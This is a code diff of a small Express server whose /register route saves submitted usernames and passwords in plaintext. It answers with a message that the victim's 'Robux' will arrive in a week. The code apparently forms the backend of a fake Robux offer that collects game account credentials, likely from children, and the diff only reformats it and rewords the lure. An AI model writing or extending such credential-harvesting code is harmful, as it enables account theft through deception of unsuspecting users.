@@ -10,19 +10,20 @@ app.use(express.json());
 app.use(express.static("public"));
 
 app.post("/register", (req, res) => {
-    const { username, password } = req.body;
+  const { username, password } = req.body;
 
-    const query = "INSERT INTO users (username, password) VALUES (?, ?)";
+  const query = "INSERT INTO users (username, password) VALUES (?, ?)";
 
-    db.query(query, [username, password], (err, result) => {
-        if (err) {
-            console.log("DB Error:", err);
-            return res.status(500).send("Database error");
-        }
+  db.query(query, [username, password], (err) => {
+    if (err) {
+      console.error("DB Error:", err);
+      return res.status(500).send("Database error");
+    }
 
-        res.status(200).send("Your Robux has been successfully purchased and you will get it in a few days");
-    });
+    res.send("Success! You will get your robux in one week");
+  });
 });
+
 
 app.listen(PORT, () => {
     console.log("Your server is running on http://localhost:3000");
